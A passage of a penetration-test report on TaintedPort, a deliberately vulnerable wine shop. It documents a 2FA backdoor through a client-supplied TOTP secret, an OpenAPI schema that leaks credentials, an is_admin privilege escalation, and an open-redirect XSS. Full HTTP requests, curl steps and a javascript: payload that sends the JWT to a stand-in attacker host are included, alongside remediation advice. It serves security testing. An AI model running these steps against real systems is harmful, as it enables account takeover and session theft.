2. Generate an attacker-chosen base32 TOTP secret client-side (e.g. 16 random bytes, base32-encoded).
3. Compute an RFC 6238 SHA-1 6-digit TOTP code for that secret at the current 30 s time step.
4. Call `POST /auth/2fa/enable` with `Authorization: Bearer <victim JWT>` and JSON body `{"totp_secret":"<attacker secret>","totp_code":"<code>"}`. The server returns `HTTP 200 {"success":true,"message":"Two-factor authentication enabled successfully."}`.
5. Confirm `GET /auth/me` now returns `totp_enabled: true`.
6. Confirm `POST /auth/login {email,password}` now returns `{"success":false,"requires_2fa":true,"message":"Two-factor authentication code required."}`.
7. Compute a fresh TOTP code from the attacker's secret and confirm `POST /auth/login {email,password,totp_code}` returns HTTP 200 with a valid session token.

All seven steps completed successfully. The `poc/poc.py` script performs the full sequence with a self-registering victim so it is safe to re-run. The `poc/verify.py` script returns exit 0 with a `[VULNERABLE]` banner when the endpoint still trusts client-supplied secrets.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Register a fresh victim account to obtain a session token**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Validator19 Test","email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<...>","user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false}}
```


> Standard registration path returns a valid JWT. No /auth/2fa/setup is invoked at any point in this exploit.



**2. Enable 2FA with an ATTACKER-CHOSEN TOTP secret (no /auth/2fa/setup call)**

*Request:*
```http
POST /auth/2fa/enable HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<victim token>

{"totp_secret":"KZAUYSKEIFKE6URRHFKEKU2UEE","totp_code":"988057"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Two-factor authentication enabled successfully."}
```


> The `totp_secret` field is fully attacker-controlled. The server validates the accompanying `totp_code` against that same client-supplied secret (a check that trivially succeeds because the client generated both) and persists the client's secret as the account's canonical TOTP secret. Current password is not required.



**3. Confirm totp_enabled=true via /auth/me**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<victim token>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false,"totp_enabled":true,"created_at":"2026-07-20 11:52:22"}}
```


> The account is now backdoored — totp_enabled=true, tied to a secret only the attacker knows.



**4. Login with password only is refused**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"requires_2fa":true,"message":"Two-factor authentication code required."}
```


> The victim can no longer authenticate with just their password — a TOTP code is required. Since the enrolled secret was never displayed to the victim, they have no authenticator app entry that produces valid codes.



**5. Login succeeds with a TOTP code from the ATTACKER'S secret**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"valid19-1784548342@example.com","password":"ValidTest!23-f2f5759c","totp_code":"988057"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<new session>","user":{"id":468,"name":"Validator19 Test","email":"valid19-1784548342@example.com","is_admin":false}}
```


> A valid session token is returned when the attacker supplies a code computed from the secret they chose in step 2. Persistence is durable: password reset by the victim would not remove the attacker's secret.





#### Remediation

1. Remove `totp_secret` from the `POST /auth/2fa/enable` request contract. The server must be the sole authority on the shared secret. Ignore or explicitly reject the field if a client sends it.
2. Store a pending secret server-side during `POST /auth/2fa/setup` (e.g. a `pending_totp_secret` column with an expiry timestamp). Ensure it is keyed to the calling `user_id`.
3. On `POST /auth/2fa/enable`: read the pending secret for the calling `user_id`, verify the submitted `totp_code` against it, and — only on success — promote it to `totp_secret`, set `totp_enabled = true`, and clear `pending_totp_secret`. Reject enable requests where no pending secret exists or the pending secret has expired.
4. Require the user's current password on `POST /auth/2fa/enable` (matching the gating on `/auth/2fa/disable`, `/auth/password`, and `/auth/email`) so a passively-stolen session token is insufficient to backdoor MFA.
5. Emit an alert email to the account holder whenever 2FA is enabled, disabled, or the underlying secret is rotated. Include a "this wasn't me" link that revokes all active sessions and disables 2FA.
6. Audit existing accounts with `totp_enabled=1` whose stored secret does not match any secret ever issued by `/auth/2fa/setup` (compare against setup-time logs / audit trail): those accounts are candidates for having been backdoored via this bug and should have MFA reset out-of-band.
7. Rate-limit repeated `POST /auth/2fa/enable` attempts per session and per account to slow abuse.

---


### vuln-0002: Public OpenAPI Schema at /openapi.yaml Discloses Working Credentials, Internal URLs, and Hidden High-Risk Endpoints










**Severity:** HIGH | **CVSS:** 8.2 | **Endpoint:** `/openapi.yaml` | **Method:** GET | **CWE:** CWE-200 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

#### Description

The production API host `https://api.taintedport.com` serves its full OpenAPI 3.0.3 document without any authentication at `/openapi.yaml`. A single unauthenticated HTTP GET returns a ~40 KB YAML file that (a) embeds plaintext passwords for two live user accounts inside the `info.description` "Demo Accounts" block, (b) advertises internal server URLs (`http://localhost:8080/api`, `http://localhost:8000/api`) in the `servers:` list, and (c) enumerates four attack-shaped endpoints that are not linked from the SPA and are not otherwise discoverable: `POST /wines/import-url`, `GET /wines/export/{filename}`, `PUT /orders/{id}/status`, and `GET /wines/ratings`. The schema descriptions themselves are unusually explicit — the `import-url` route "Accepts any URL including remote HTTP endpoints or local file paths", and the `orders/{id}/status` route describes an `is_admin` boolean body parameter as a "Client-provided admin flag".

Independent reproduction confirmed all three disclosure categories: the schema is served publicly, both disclosed credential pairs authenticate against `POST /auth/login` and return valid HS256 JWTs, all four hinted endpoints are live, and the schema-documented `is_admin` privesc bypass on `PUT /orders/{id}/status` is real — sending the flag transitions the response from 403 "Admin access required." to 404 "Order not found." for a non-existent order, proving the authorization check was bypassed by a client-supplied field.


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Prerequisites: none — attacker is anonymous on the public internet.    │
└─────────────────────────────────────────────────────────────────────────┘

     Attacker                                        api.taintedport.com
   (unauthenticated)                                  (PHP 8.2.31 backend)
        │                                                       │
   [1]  │  GET /openapi.yaml                                    │
        │──────────────────────────────────────────────────────▶│
        │                                                       │  no auth
        │                                                       │  no gating
        │                                                       │  no rate limit
        │  200 OK  (40,942 bytes YAML)                          │
        │◀──────────────────────────────────────────────────────│
        │
        │  Extracts from schema:
        │   • info.description → "Demo Accounts"
        │       joe@example.com  / password123
        │       jane@example.com / password123
        │   • servers: http://localhost:8080/api  (internal)
        │             http://localhost:8000/api  (internal)
        │   • paths: 4 hidden endpoints
        │       POST /wines/import-url    "accepts ... local file paths"  (SSRF)
        │       GET  /wines/export/{filename}  (arbitrary file read)
        │       PUT  /orders/{id}/status   is_admin: "Client-provided admin flag"
        │       GET  /wines/ratings
        │
   [2]  │  POST /auth/login  {joe@example.com, password123}     │
        │──────────────────────────────────────────────────────▶│
        │  200 OK  {token: eyJ... , user.id=1}                  │
        │◀──────────────────────────────────────────────────────│
        │                     ▲
        │                     └── AUTH BYPASS: anonymous → authenticated user
        │                         (same works for jane@example.com → user.id=2)
        │
   [3]  │  PUT /orders/999999/status  {}                        │
        │  Authorization: Bearer <joe_token>                    │
        │──────────────────────────────────────────────────────▶│
        │  403 "Admin access required."                         │
        │◀──────────────────────────────────────────────────────│
        │
   [4]  │  PUT /orders/999999/status                            │
        │  {"status":"shipped","is_admin":true}   ◀── flag from schema
        │  Authorization: Bearer <joe_token>                    │
        │──────────────────────────────────────────────────────▶│
        │  404 "Order not found."                               │
        │◀──────────────────────────────────────────────────────│
        │                     ▲
        │                     └── PRIVESC CONFIRMED: 403 → 404 means
        │                         the admin check was skipped and
        │                         execution reached the order lookup.
        │                         On any real order id → state tampering.
        ▼

Root cause
──────────
The developer-only OpenAPI document is shipped unauthenticated on the
production API host. The schema is BOTH the payload (working credentials)
AND the roadmap (hidden endpoints + their exploitable shapes). A single
anonymous GET yields:

    (a) authenticated user sessions (via disclosed passwords),
    (b) a catalogue of SSRF / file-read / privesc endpoints, and
    (c) explicit hints — including the "is_admin" body flag — that
        turn those endpoints into single-request exploits.
```


#### Impact

An unauthenticated network attacker who fetches `/openapi.yaml` immediately obtains:

1. **A full authentication bypass to two user accounts.** `joe@example.com / password123` (user_id=1) and `jane@example.com / password123` (user_id=2) authenticate on the production API and return valid JWTs with no MFA challenge. This turns an anonymous file read into a fully authenticated session.
2. **A roadmap of hidden high-risk endpoints.** Four routes not linked from the SPA are listed with full request/response models: an SSRF surface (`POST /wines/import-url`, whose schema description explicitly permits `file://` and localhost URLs), a file-read surface (`GET /wines/export/{filename}`, confirmed to return file contents), a privilege-escalation surface (`PUT /orders/{id}/status` with a client-controlled `is_admin` body flag), and `GET /wines/ratings`.
3. **A confirmed client-side admin bypass.** The `is_admin` bypass is not hypothetical — probing `PUT /orders/999999/status` (non-existent id) with `{"status":"shipped","is_admin":true}` transitions the response from 403 to 404, demonstrating that the server accepts the client-supplied admin flag and proceeds past authorization. On any real order id this becomes direct order-state tampering by a non-admin user.
4. **Internal infrastructure detail.** The `servers:` list leaks two internal Docker/localhost URLs, useful for host-header pivots and cross-referencing internal deployment topology.

Business risk: credential leak, hidden-endpoint enumeration, immediate privilege-escalation vector, and a persistent disclosure channel — anyone who can reach the API can obtain all of the above with a single unauthenticated GET.

#### Technical Analysis

The PHP backend (`X-Powered-By: PHP/8.2.31`) routes `/openapi.yaml` to a static handler that returns the developer-facing schema. There is no authentication guard, no environment gating, no allow-list on referer/host, and no rate limit — a single anonymous HTTP GET returns the 40,942-byte YAML in full with `Content-Type: application/octet-stream`.

The `info.description` field is authored to onboard developers to this deliberately vulnerable application and includes a Markdown "## Demo Accounts" block that hardcodes two credentials in plaintext. Both accounts are live in the running production API — a `POST /auth/login` with either pair returns HTTP 200 and a valid HS256 JWT signed by the API's secret. There is no MFA challenge for either account.

The `paths:` block enumerates every server route with request/response schemas. Cross-referencing against the SPA bundle and reconnaissance endpoint catalog identifies four routes that are not otherwise discoverable:

- `POST /wines/import-url` — `security: BearerAuth`, `body: {url: string}`, description: "Accepts any URL including remote HTTP endpoints or local file paths." This is an explicit SSRF surface.
- `GET /wines/export/{filename}` — `filename` is a client-controlled path parameter documented as "Filename to download from exports directory". Live probing confirmed the server returns the file contents inside a JSON envelope (`{"success":true,"filename":"wines-catalog.csv","content":"..."}`).
- `PUT /orders/{id}/status` — `security: BearerAuth`, body `{status, is_admin}` with `is_admin` explicitly documented as "Client-provided admin flag". Live probing (non-existent order id `999999`) directly confirmed the bypass: without `is_admin`, the server returns 403 "Admin access required."; with `"is_admin": true`, the server returns 404 "Order not found.", proving that the authorization check was skipped and the request proceeded to order lookup.
- `GET /wines/ratings` — informational aggregate endpoint, publicly accessible.

The `servers:` list leaks two internal URLs — `http://localhost:8080/api` (Local Docker) and `http://localhost:8000/api` (Local Development) — which reveal the internal deployment shape.

Root cause: the developer-only OpenAPI document was shipped into the public production API without an authentication gate or environment check. The schema is simultaneously the payload (usable credentials) and the roadmap (hidden endpoints and their exploitable shapes). The consequence is a chain: schema disclosure → immediate authentication bypass → hidden endpoint enumeration → schema-documented privilege escalation.

Note: The frontend host `https://taintedport.com/openapi.yaml` returns HTTP 200 but with a Next.js "This page could not be found" HTML body — the OpenAPI is only served by the PHP backend on the API host.


#### Proof of Concept


Prerequisites: network access to `https://api.taintedport.com`. No credentials, no user interaction.

Reproduction:

1. `curl -sk https://api.taintedport.com/openapi.yaml | head -20` — observe HTTP 200, ~40 KB YAML body starting with `openapi: 3.0.3`, and the plaintext "Demo Accounts" block: `joe@example.com / password123` and `jane@example.com / password123`.
2. `curl -sk -X POST https://api.taintedport.com/auth/login -H 'Content-Type: application/json' -d '{"email":"joe@example.com","password":"password123"}'` — observe HTTP 200 with `{"success":true,"token":"eyJ...","user":{"id":1,...}}`. Repeat for `jane@example.com` with the same password — HTTP 200 with `user.id=2`.
3. Anonymous probes of the hidden endpoints:
   - `GET /wines/ratings` — 200, ratings JSON.
   - `GET /wines/export/wines-catalog.csv` — 200 with file contents.
   - `POST /wines/import-url` with body `{}` (using the joe token) — 400 `"URL is required."`, confirming the endpoint exists.
4. Directly demonstrate the schema-documented privesc bypass (using non-existent order id 999999 to avoid modifying data):
   - `PUT /orders/999999/status` with body `{}` and joe's token → 403 `"Admin access required."`.
   - `PUT /orders/999999/status` with body `{"status":"shipped","is_admin":true}` and joe's token → 404 `"Order not found."`. Adding the client-supplied `is_admin: true` (which the schema itself documents) bypassed the admin check and moved execution into order lookup — the server accepted the client's claim of admin status.
5. Run `python3 poc/poc.py` for an end-to-end reproduction with printed evidence.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Anonymous GET of /openapi.yaml — no auth, no rate limit**

*Request:*
```http
GET /openapi.yaml HTTP/1.1
Host: api.taintedport.com
Accept: */*

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 40942

openapi: 3.0.3
info:
  title: TaintedPort API
  description: |
    REST API for TaintedPort, an intentionally vulnerable Portuguese wine store for security testing.

    ## Authentication
    Most endpoints require a JWT Bearer token obtained via the login endpoint.
    Include the token in the `Authorization` header: `Bearer <token>`

    ## Demo Accounts
    - joe@example.com / password123
    - jane@example.com / password123
  version: 1.0.0
...
servers:
  - url: https://api.taintedport.com
  - url: http://localhost:8080/api
  - url: http://localhost:8000/api
...
  /wines/ratings:
  /wines/import-url:      # 'Accepts any URL including remote HTTP endpoints or local file paths.'
  /wines/export/{filename}:
  /orders/{id}/status:    # is_admin: boolean — 'Client-provided admin flag'
```


> Full 40 KB developer-facing OpenAPI document served without authentication. The info.description block ships plaintext credentials, the servers list leaks internal localhost URLs, and paths: enumerates four endpoints not linked from the SPA including two whose descriptions directly advertise dangerous behaviour (SSRF and client-side admin flag).



**2. Log in as joe@example.com using the schema-disclosed password**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"joe@example.com","password":"password123"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjpmYWxzZSwuLi59...","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}
```


> Credentials copied verbatim from the schema authenticate the user account id=1. The server returns a valid HS256 JWT with no MFA challenge — full unauthenticated-to-authenticated bypass.



**3. Log in as jane@example.com using the schema-disclosed password**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"jane@example.com","password":"password123"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLi4ufQ...","user":{"id":2,"name":"Jane Doe","email":"jane@example.com","is_admin":false}}
```


> Second disclosed credential also authenticates — user id=2. Two live sessions obtained from a single anonymous document read.



**4. Confirm hidden endpoint /wines/ratings exists (not linked in SPA)**

*Request:*
```http
GET /wines/ratings HTTP/1.1
Host: api.taintedport.com

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"ratings":{"1":{"avg_rating":4.3,"review_count":21},"2":{"avg_rating":4.1,"review_count":9}, ...}}
```


> Endpoint is live and returns data. Only discoverable via the leaked schema.



**5. Confirm hidden endpoint /wines/export/{filename} exists — arbitrary-file-read surface**

*Request:*
```http
GET /wines/export/wines-catalog.csv HTTP/1.1
Host: api.taintedport.com

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"filename":"wines-catalog.csv","content":"id,name,region,type,vintage,price\n1,Quinta do Vallado Douro Tinto,Douro,Red,2020,185.00\n..."}
```


> Server returns file contents inside a JSON envelope keyed by a client-controlled filename — a path-traversal / LFI target that the schema explicitly documents as an 'exports directory' download.



**6. Confirm hidden endpoint /wines/import-url exists — SSRF surface**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{}
```

*Response:*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"success":false,"message":"URL is required."}
```


> Server-side error confirms the endpoint is real and accepts a `url` parameter. The schema description advertises 'Accepts any URL including remote HTTP endpoints or local file paths.' — an explicit SSRF/LFI intent.



**7. Confirm privesc via schema-documented is_admin flag on /orders/{id}/status (non-existent order id used to avoid data modification)**

*Request:*
```http
PUT /orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{}
```

*Response:*
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```


> Without the client-supplied is_admin flag, the request is refused with 403.



**8. Same endpoint WITH is_admin=true — schema-documented bypass observed**

*Request:*
```http
PUT /orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{"status":"shipped","is_admin":true}
```

*Response:*
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```


> Adding is_admin=true changed the response from 403 (auth denied) to 404 (order lookup) — the server accepted the client-supplied admin flag and proceeded past the authorization check. The schema itself both discloses this flag and describes it as 'Client-provided admin flag'. On any real order id this becomes direct order-state tampering by a non-admin user.





#### Remediation

1. **Stop serving the developer schema on the production API host.** Move `/openapi.yaml` behind authentication, restrict it to a documentation-only environment, or ship it only in non-production builds. If public API documentation is desired, publish a hand-curated public variant that omits credentials, internal URLs, and internal-only endpoints.

2. **Remove all real credentials from the schema.** The `## Demo Accounts` block in `info.description` must not contain any password that authenticates against a live environment. Onboarding tutorials should reference seed scripts, not shipped passwords.

3. **Immediately rotate the passwords for `joe@example.com` and `jane@example.com`** and force a password reset on next login. Audit any other account whose credentials appear in code, documentation, schemas, or version control.

4. **Remove the internal servers entries** (`http://localhost:8080/api`, `http://localhost:8000/api`) from any schema that is ever exposed externally.

5. **Harden the endpoints the schema exposes** — independently of removing the schema, these routes remain exploitable once discovered:
   - `POST /wines/import-url` — allow-list target hosts, disallow `file://`, `localhost`, RFC1918 ranges, cloud metadata IPs (169.254.169.254, 100.100.100.200, etc.), and disable HTTP redirects to those targets.
   - `GET /wines/export/{filename}` — allow-list filenames or canonicalise the path and confine access to the exports directory; reject any input containing `..`, `/`, `\`, or NUL bytes.
   - `PUT /orders/{id}/status` — remove the client-supplied `is_admin` field entirely; derive privileges solely from the JWT and merge this route into the existing `/admin/orders/{id}/status` code path so a single admin check governs order state changes.

6. **Add CI checks that fetch `/openapi.yaml`, `/openapi.json`, `/swagger`, `/swagger.json`, `/docs`, `/redoc`, and `/api-docs` unauthenticated against the production host and assert 401/404.**

---


### vuln-0006: Open Redirect in POST /auth/login `redirect` Field Enables Same-Origin XSS and JWT Theft via `javascript:` URI










**Severity:** HIGH | **CVSS:** 8.1 | **Endpoint:** `/auth/login` | **Method:** POST | **CWE:** CWE-601 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

#### Description

The TaintedPort authentication flow permits an attacker to control the URL that the frontend navigates to immediately after a successful login. Because the frontend performs this navigation with `window.location.href = <server-supplied URL>` and the server performs no validation on the supplied value, the flaw can be escalated from a classic open redirect (arbitrary external navigation) to arbitrary same-origin JavaScript execution using a `javascript:` URI, which in turn steals the authentication JWT and yields full account takeover.

Root cause is a two-part missing-validation bug:

1. The API endpoint `POST /auth/login` accepts an undocumented `redirect` field on the JSON body and, on a successful authentication, echoes it back verbatim in the response as `redirect_url`. The server applies no scheme allowlist, no host allowlist, no path normalization, and no length limit. Values such as `javascript:...`, `data:text/html,...`, `//evil.tld/`, and arbitrary `https://` targets are all reflected unchanged.

2. The Next.js login page at `https://taintedport.com/login` reads `?redirect=` from the query string, forwards it to the API in the login body, and, on a `success:true` response, executes `window.location.href = response.redirect_url` unconditionally. `location.href` in current mainstream browsers executes `javascript:` URIs in the current document's origin.

Combined, these produce a same-origin XSS reachable via a single crafted URL that a victim clicks and logs in through. Because `taintedport.com` sends no `Content-Security-Policy`, the injected script has full DOM/`localStorage`/`fetch` access. The authentication token — an HS256 JWT with a seven-day expiry — is stored as `localStorage.token`, so a one-liner payload can lift the token and exfiltrate it to an attacker-controlled host. No server-side revocation endpoint exists, so the stolen token remains valid for the remainder of its seven-day lifetime.

Even against a browser that refused `javascript:` URLs from `location.href`, the same primitive allows redirection to arbitrary external `https:` or `data:` targets, enabling credential-harvest phishing on a look-alike page delivered straight from a legitimate `taintedport.com` URL. 2FA does not mitigate: the redirect fires only after the 2FA step succeeds.


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Prerequisites: victim has a TaintedPort account. Attacker owns none.   │
│  No CSP on taintedport.com. JWT stored in localStorage.token (7-day).   │
└─────────────────────────────────────────────────────────────────────────┘

  ATTACKER                     VICTIM BROWSER                 TAINTEDPORT
                                                              (web + api)
  ┌────────┐                    ┌───────────────┐             ┌────────┐
  │Crafts  │  (1) phishing link │               │             │        │
  │URL with│ ─────────────────► │  Clicks link  │             │        │
  │javascript:                  │               │             │        │
  │payload │                    │               │             │        │
  └────────┘                    └──────┬────────┘             │        │
                                       │                      │        │
              (2) GET /login?redirect=javascript:...          │        │
                                       ├────────────────────► │  Next  │
                                       │                      │  .js   │
                                       │◄──── 200, login SPA ─┤ (no CSP)
                                       │                      │        │
                                       ▼                      │        │
                              ┌────────────────┐              │        │
                              │ Victim types   │              │        │
                              │ real email +   │              │        │
                              │ password (+2FA)│              │        │
                              └────────┬───────┘              │        │
                                       │                      │        │
      (3) POST /auth/login {email,password,redirect:"javascript:..."}  │
                                       ├────────────────────► │  API   │
                                       │                      │        │
                                       │◄─── 200 {token,user, │        │
                                       │      redirect_url:   │        │
                                       │  "javascript:..."}◄──┤ echoes │
                                       │                      │ redirect
                                       ▼                      │ verbatim
                              ┌──────────────────┐            │        │
                              │ Client stores    │            │        │
                              │ JWT in           │            │        │
                              │ localStorage.token          │           │
                              └────────┬─────────┘            │        │
                                       │                      │        │
              (4) window.location.href = redirect_url         │        │
                        (== "javascript:<attacker>")          │        │
                                       │                      │        │
                                       ▼                      │        │
                    ┌──────────────────────────────────┐      │        │
                    │  Browser EXECUTES JS in          │      │        │
                    │  taintedport.com origin:         │      │        │
                    │    reads localStorage.token      │      │        │
                    │    == valid 7-day JWT            │      │        │
                    └──────────────┬───────────────────┘      │        │
                                   │                          │        │
     (5) fetch('https://attacker/steal?t='+localStorage.token)│        │
    ◄──────────────────────────────┘                          │        │
   ATTACKER                                                   │        │
   receives                                                   │        │
   JWT                                                        └────────┘
      │
      │  (6) Bearer JWT → api.taintedport.com/*
      ▼
  Full account takeover: change email/password, disable 2FA,
  place orders, read owner_password_hash / owner_totp_secret
  from GET /orders/{id}. No server-side revocation exists.

  ROOT CAUSE (two-part missing validation):
    • Server: POST /auth/login reflects any `redirect` value as `redirect_url`
              — no scheme/host allowlist.
    • Client: window.location.href = redirect_url — no scheme/origin check;
              a `javascript:` value executes in the current origin.
  AMPLIFIERS: no CSP; JWT in localStorage; no token revocation; 7-day TTL.
```


#### Impact

A network attacker who convinces any TaintedPort user to click a link and complete a login gains:

- **Full account takeover.** The victim's 7-day HS256 JWT (`localStorage.token`) is exfiltrated by the payload running in the `taintedport.com` origin. Once stolen, the token is valid for every authenticated endpoint on `api.taintedport.com`, including:
  * `PUT /auth/email` and `PUT /auth/password` — change credentials and lock the legitimate user out.
  * `POST /auth/2fa/disable` — remove the victim's second factor.
  * `POST /orders`, `POST /cart` — place fraudulent orders on the victim's account.
  * `GET /orders/{id}` — read sensitive fields including `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`.
- **No revocation.** The application has no server-side session invalidation, so a stolen token remains usable for its remaining 7-day lifetime; changing the password on the victim's side does not invalidate the attacker's token.
- **Silent phishing.** The delivery URL is on the real `taintedport.com` domain with a valid TLS certificate. The victim sees the legitimate login page and enters real credentials; a well-crafted payload can silently exfiltrate the token and then continue on to `/wines`, leaving the victim unaware.
- **Downgrade path — vanilla open redirect.** The same primitive redirects to arbitrary external URLs (`https://…`, `data:…`), enabling credential-harvest phishing on look-alike pages served from a URL that starts with the authoritative `https://taintedport.com/`.

2FA does not mitigate the attack: the redirect step fires only after the 2FA challenge succeeds.

#### Technical Analysis

Server-side reflection was confirmed directly against `https://api.taintedport.com/auth/login`. Sending a JSON body of the form `{"email":"…","password":"…","redirect":"<X>"}` produces a 200 response containing `"redirect_url":"<X>"` for every value of X tried:

  - `https://attacker.example.com/collect` → reflected verbatim
  - `javascript:alert(document.domain)`   → reflected verbatim
  - `data:text/html,<h1>x</h1>`           → reflected verbatim
  - `//evil.example.com/`                 → reflected verbatim
  - `/wines`                              → reflected verbatim

No normalization or canonicalization is performed; there is no allowlist and no rejection of dangerous schemes.

Client-side sink was validated with a real Chromium browser. The compiled login-page bundle (`_next/static/chunks/app/login/page-*.js`) contains the sequence:

    let a = t.get("redirect") || "";
    let n = await r(u.email, u.password, h ? m : void 0, a || void 0);
    if (n.requires_2fa) { … return }
    if (n.redirect_url) { window.location.href = n.redirect_url; return }

`t` is the `URLSearchParams` of the current URL; `r` is the axios login wrapper that ships `redirect: a` in the JSON body. After a successful login (including the optional 2FA step), the client sets `location.href` to the server's `redirect_url` without any scheme or origin check.

Because `location.href = "javascript:<expr>"` in every current mainstream browser executes `<expr>` in the current document's origin, an attacker who lures a victim to `https://taintedport.com/login?redirect=javascript:<payload>` obtains arbitrary JavaScript execution in the `taintedport.com` origin at the moment the victim finishes signing in. The taintedport.com origin has:

  - No `Content-Security-Policy` header (verified with a fresh request; none of `default-src`, `script-src`, or `frame-ancestors` are declared).
  - No `X-Frame-Options`.
  - JWT stored as plaintext in `localStorage.token`, freely readable by any script in the origin.
  - No server-side token invalidation (logout is `localStorage.removeItem("token")` only).

Consequently, a payload as small as `javascript:fetch('https://attacker/'+localStorage.token)` steals a fully privileged, non-revocable 7-day session token. The stolen token was decoded (HS256, header `{"alg":"HS256","typ":"JWT"}`) and observed to contain `{"user_id":374,"email":"…","is_admin":false,"iat":…,"exp":…}` with a lifetime of exactly 7 days from `iat`.

The vulnerability is exploitable regardless of whether the victim has 2FA enabled: the `redirect_url` handler runs after the 2FA challenge is passed. The vulnerability does not depend on any knowable identifier — the attacker simply crafts a static URL — so attack complexity is Low.

Related weaknesses that materially amplify impact (secondary, not scored separately):

  - Absent CSP on `taintedport.com` (the single most effective mitigation for `javascript:` URI XSS).
  - JWT in `localStorage` rather than an HttpOnly cookie.
  - No revocation endpoint; the stolen token remains valid for its full lifetime.
  - `GET /orders/{id}` exposes `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`, so any authenticated user (including the attacker impersonating the victim) can read those sensitive fields for the victim's own orders.


#### Proof of Concept


Prerequisites: any TaintedPort account (the vulnerability is triggered by the victim's own login; the account used to demonstrate impact is a scan-owned test user).

1. Attacker constructs the delivery URL:

   `https://taintedport.com/login?redirect=javascript%3Adocument.title%3D%22PWNED_%22%2Bdocument.domain%2B%22_TOKEN_%22%2BlocalStorage.getItem(%22token%22).slice(0%2C40)`

   (In a real attack the payload would be
   `javascript:fetch('https://attacker/'+localStorage.token)` — invisible to the victim.)

2. Attacker sends the link to a victim (email, message, misleading link on a controlled site, etc.). The URL is on the real `taintedport.com` origin with the real certificate.

3. Victim opens the URL. The genuine TaintedPort login page renders (unchanged UI, no visual indication of tampering). Victim enters their real email/password (and TOTP, if enabled) and clicks "Sign In".

4. The Next.js client submits `POST https://api.taintedport.com/auth/login` with a JSON body containing the victim's real credentials **and** the attacker's `redirect` value. The API responds with `success:true`, the fresh JWT, the user object, and `redirect_url` = the attacker's exact `javascript:` string.

5. The client runs `window.location.href = <redirect_url>` — Chromium/Firefox execute the JavaScript in the current `taintedport.com` document.

6. Observed effect: `document.domain` is `taintedport.com`; `document.body.textContent` becomes `PWNED_taintedport.com_TOKEN_eyJhbGciOiJIUzI1NiIsInR5cCI6Ik…` — proof that the JWT was successfully read out of `localStorage`. Screenshot: `evidence/01-xss-triggered.png`.

The `poc.py` script automates the reproduction end-to-end. Phase 1 (curl-only, no browser required) confirms server-side reflection of five different unsafe schemes. Phase 2 launches Chromium via Playwright, submits the crafted URL and real credentials, then asserts that the injected code executed in the taintedport.com origin and read the JWT. The `verify.py` regression test checks only Phase 1 (the server-side flaw) and can be re-run to detect a fix.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Server echoes attacker-controlled `redirect` verbatim (javascript: URI)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<victim's real password>","redirect":"javascript:alert(document.domain)"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

